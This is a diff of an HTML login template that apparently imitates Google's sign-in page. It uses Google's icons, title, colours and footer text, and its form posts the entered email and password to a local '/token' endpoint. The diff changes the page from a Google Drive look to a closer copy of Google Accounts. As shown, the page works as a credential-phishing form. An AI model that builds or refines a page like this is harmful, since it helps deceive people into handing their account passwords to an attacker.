@@ -1,122 +1,84 @@
+<!-- templates/login.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Sign in – Google Drive</title>
+  <title>Sign in – Google Accounts</title>
   <link rel="icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto&display=swap">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    * {
-      box-sizing: border-box;
-    }
     body {
-      font-family: 'Roboto', sans-serif;
-      background: #f1f1f1;
       margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: #fff;
+      color: #202124;
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       height: 100vh;
     }
-    .login-box {
-      background: white;
-      padding: 40px 30px;
-      border-radius: 10px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
-      max-width: 400px;
+    .container {
       width: 100%;
-      transition: all 0.3s ease-in-out;
+      max-width: 400px;
+      padding: 30px 40px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
     }
-    .login-box img {
-      width: 80px;
+    img {
+      width: 75px;
       display: block;
-      margin: 0 auto 20px;
+      margin: 0 auto 15px;
     }
-    .login-box h2 {
-      text-align: center;
+    h2 {
+      font-weight: 400;
+      font-size: 24px;
       margin-bottom: 20px;
-      color: #202124;
-    }
-    .input-field {
-      position: relative;
+      text-align: center;
     }
     input {
       width: 100%;
-      padding: 12px 40px 12px 12px;
+      padding: 14px;
       margin: 10px 0;
-      border: 1px solid #ccc;
+      border: 1px solid #dadce0;
       border-radius: 4px;
-      font-size: 16px;
-      transition: 0.2s;
+      font-size: 14px;
     }
     input:focus {
       border-color: #1a73e8;
       outline: none;
-      box-shadow: 0 0 3px #1a73e8;
-    }
-    .toggle-password {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-      color: #888;
     }
     button {
+      width: 100%;
       background: #1a73e8;
       color: white;
-      border: none;
       padding: 12px;
-      width: 100%;
+      border: none;
+      font-weight: 500;
+      font-size: 14px;
       border-radius: 4px;
-      font-size: 16px;
       margin-top: 10px;
       cursor: pointer;
-      transition: 0.2s;
     }
-    button:active {
-      transform: scale(0.98);
-    }
-    .loading {
-      display: none;
-      text-align: center;
+    .footer {
+      font-size: 12px;
+      color: #5f6368;
       margin-top: 15px;
-    }
-    .loading.show {
-      display: block;
-    }
-    @media (max-width: 480px) {
-      .login-box {
-        padding: 30px 20px;
-      }
+      text-align: center;
     }
   </style>
 </head>
 <body>
-  <div class="login-box">
-    <img src="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png" alt="Google Drive">
+  <div class="container">
+    <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Avatar">
     <h2>Sign in</h2>
-    <form id="loginForm" action="/token" method="POST">
+    <form action="/token" method="POST">
       <input type="email" name="email" placeholder="Email or phone" required>
-      <div class="input-field">
-        <input type="password" name="password" id="password" placeholder="Enter your password" required>
-        <span class="toggle-password" onclick="togglePassword()">👁️</span>
-      </div>
+      <input type="password" name="password" placeholder="Enter your password" required>
       <button type="submit">Next</button>
-      <div class="loading" id="loading">🔄 Please wait...</div>
     </form>
+    <div class="footer">Not your computer? Use Guest mode to sign in privately.</div>
   </div>
-
-  <script>
-    function togglePassword() {
-      const pwd = document.getElementById("password");
-      pwd.type = pwd.type === "password" ? "text" : "password";
-    }
-
-    const form = document.getElementById('loginForm');
-    form.addEventListener('submit', function () {
-      document.getElementById('loading').classList.add('show');
-    });
-  </script>
 </body>
 </html>
